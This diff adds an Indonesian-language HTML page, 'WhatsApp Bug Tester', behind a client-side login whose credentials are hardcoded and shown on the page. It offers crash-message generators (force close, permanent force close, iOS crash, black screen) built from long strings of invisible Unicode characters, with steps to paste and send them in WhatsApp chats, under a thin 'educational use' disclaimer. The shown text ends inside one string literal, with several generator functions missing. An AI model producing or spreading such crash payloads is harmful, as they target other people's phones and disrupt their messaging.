@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Bug Tester - Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #25D366, #128C7E);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .login-container, .main-container {
+            max-width: 400px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+        
+        .main-container {
+            max-width: 800px;
+            display: none;
+        }
+        
+        h1 {
+            font-size: 2rem;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 500;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.9);
+            font-size: 1rem;
+        }
+        
+        button {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            background: #25D366;
+            color: white;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        button:hover {
+            background: #128C7E;
+        }
+        
+        .error-message {
+            color: #ff5252;
+            margin-top: 10px;
+            display: none;
+        }
+        
+        .warning {
+            background: rgba(255, 0, 0, 0.2);
+            border-left: 4px solid #ff5252;
+            padding: 15px;
+            margin-bottom: 25px;
+            border-radius: 5px;
+            text-align: left;
+        }
+        
+        .bug-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+        
+        .bug-card {
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 10px;
+            padding: 20px;
+            transition: transform 0.3s, background 0.3s;
+            cursor: pointer;
+            text-align: center;
+        }
+        
+        .bug-card:hover {
+            transform: translateY(-5px);
+            background: rgba(255, 255, 255, 0.25);
+        }
+        
+        .bug-icon {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+        }
+        
+        .bug-title {
+            font-size: 1.2rem;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        
+        .bug-desc {
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+        
+        .instructions {
+            margin-top: 30px;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: left;
+        }
+        
+        .instructions h3 {
+            margin-bottom: 15px;
+        }
+        
+        .instructions ol {
+            margin-left: 20px;
+        }
+        
+        .instructions li {
+            margin-bottom: 10px;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.3);
+            font-size: 0.9rem;
+            opacity: 0.7;
+        }
+        
+        .logout-btn {
+            background: #ff5252;
+            width: auto;
+            padding: 8px 15px;
+            margin-top: 20px;
+        }
+        
+        .logout-btn:hover {
+            background: #d32f2f;
+        }
+        
+        @media (max-width: 600px) {
+            .bug-list {
+                grid-template-columns: 1fr;
+            }
+            
+            h1 {
+                font-size: 1.8rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Login Form -->
+    <div class="login-container" id="loginContainer">
+        <h1>WhatsApp Bug Tester</h1>
+        <p>Masukkan username dan password untuk melanjutkan</p>
+        
+        <div class="input-group">
+            <label for="username">Username:</label>
+            <input type="text" id="username" placeholder="Masukkan username">
+        </div>
+        
+        <div class="input-group">
+            <label for="password">Password:</label>
+            <input type="password" id="password" placeholder="Masukkan password">
+        </div>
+        
+        <button onclick="login()">Login</button>
+        <div class="error-message" id="errorMessage">Username atau password salah!</div>
+        
+        <div class="instructions" style="margin-top: 20px; font-size: 0.8rem;">
+            <p>Default login:</p>
+            <p><strong>Username:</strong> crash</p>
+            <p><strong>Password:</strong> gg danz</p>
+        </div>
+    </div>
+    
+    <!-- Main Content (akan ditampilkan setelah login) -->
+    <div class="main-container" id="mainContainer">
+        <header>
+            <h1>WhatsApp Bug Tester</h1>
+            <p class="subtitle">Alat untuk menguji berbagai jenis bug WhatsApp (tanpa sender)</p>
+            <button class="logout-btn" onclick="logout()">Logout</button>
+        </header>
+        
+        <div class="warning">
+            <strong>PERINGATAN:</strong> Alat ini hanya untuk tujuan edukasi dan pengujian keamanan. 
+            Jangan gunakan untuk aktivitas berbahaya atau ilegal. Selalu dapatkan izin sebelum menguji bug pada perangkat orang lain.
+        </div>
+        
+        <h2>Pilih Jenis Bug:</h2>
+        <div class="bug-list">
+            <div class="bug-card" onclick="testBug('forcelose')">
+                <div class="bug-icon">💥</div>
+                <div class="bug-title">Force Close</div>
+                <div class="bug-desc">Menyebabkan WhatsApp tertutup paksa</div>
+            </div>
+            
+            <div class="bug-card" onclick="testBug('blankcrash')">
+                <div class="bug-icon">⬜</div>
+                <div class="bug-title">Blank Crash</div>
+                <div class="bug-desc">Membuat layar kosong dan aplikasi crash</div>
+            </div>
+            
+            <div class="bug-card" onclick="testBug('blankui')">
+                <div class="bug-icon">📱</div>
+                <div class="bug-title">Blank UI</div>
+                <div class="bug-desc">Antarmuka WhatsApp menjadi kosong</div>
+            </div>
+            
+            <div class="bug-card" onclick="testBug('forcloseperma')">
+                <div class="bug-icon">🔒</div>
+                <div class="bug-title">Force Close Permanent</div>
+                <div class="bug-desc">WhatsApp terus tertutup saat dibuka</div>
+            </div>
+            
+            <div class="bug-card" onclick="testBug('crashios')">
+                <div class="bug-icon">📱</div>
+                <div class="bug-title">Crash iOS</div>
+                <div class="bug-desc">Bug khusus untuk perangkat iOS</div>
+            </div>
+            
+            <div class="bug-card" onclick="testBug('crashlayarhitam')">
+                <div class="bug-icon">⚫</div>
+                <div class="bug-title">Crash Layar Hitam</div>
+                <div class="bug-desc">WhatsApp crash dengan layar hitam</div>
+            </div>
+        </div>
+        
+        <div class="instructions">
+            <h3>Cara Penggunaan:</h3>
+            <ol>
+                <li>Pilih jenis bug yang ingin diuji</li>
+                <li>Salin kode yang dihasilkan</li>
+                <li>Buka WhatsApp dan tempel kode di chat</li>
+                <li>Kirim pesan untuk melihat efeknya</li>
+            </ol>
+        </div>
+        
+        <footer>
+            <p>© 2023 WhatsApp Bug Tester - Untuk tujuan edukasi dan pengujian keamanan</p>
+        </footer>
+    </div>
+    
+    <script>
+        // Kredensial login
+        const validUsername = "crash";
+        const validPassword = "gg danz";
+        
+        // Fungsi login
+        function login() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const errorMessage = document.getElementById('errorMessage');
+            
+            if (username === validUsername && password === validPassword) {
+                // Login berhasil
+                document.getElementById('loginContainer').style.display = 'none';
+                document.getElementById('mainContainer').style.display = 'block';
+                errorMessage.style.display = 'none';
+            } else {
+                // Login gagal
+                errorMessage.style.display = 'block';
+            }
+        }
+        
+        // Fungsi logout
+        function logout() {
+            document.getElementById('loginContainer').style.display = 'block';
+            document.getElementById('mainContainer').style.display = 'none';
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+        }
+        
+        // Enter key untuk login
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                login();
+            }
+        });
+        
+        // Fungsi test bug (sama seperti sebelumnya)
+        function testBug(bugType) {
+            let bugCode = "";
+            
+            switch(bugType) {
+                case 'forcelose':
+                    bugCode = generateForceCloseCode();
+                    break;
+                case 'blankcrash':
+                    bugCode = generateBlankCrashCode();
+                    break;
+                case 'blankui':
+                    bugCode = generateBlankUICode();
+                    break;
+                case 'forcloseperma':
+                    bugCode = generateForceClosePermaCode();
+                    break;
+                case 'crashios':
+                    bugCode = generateCrashIOSCode();
+                    break;
+                case 'crashlayarhitam':
+                    bugCode = generateCrashLayarHitamCode();
+                    break;
+                default:
+                    bugCode = "Bug tidak dikenali";
+            }
+            
+            // Menampilkan kode bug
+            alert(`Kode Bug ${bugType.toUpperCase()}:\n\n${bugCode}\n\nSalin kode ini dan tempel di WhatsApp untuk menguji.`);
+            
+            // Opsi untuk menyalin ke clipboard
+            if (navigator.clipboard) {
+                if (confirm("Salin kode ke clipboard?")) {
+                    navigator.clipboard.writeText(bugCode).then(() => {
+                        alert("Kode berhasil disalin!");
+                    }).catch(err => {
+                        console.error('Gagal menyalin: ', err);
+                    });
+                }
+            }
+        }
+        
+        function generateForceCloseCode() {
+            // Kode karakter khusus yang dapat menyebabkan force close
+            return String.fromCharCode(0x200B, 0x200B, 0x200B, 0x200B, 0x200B, 0x200B, 0x200B, 0x200B, 0x200B, 0x200B);
+        }
+        
+        function generateBlankCrashCode() {
+            // Kombinasi karakter Unicode yang dapat menyebabkan masalah rendering
+            return "᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎᠎‎
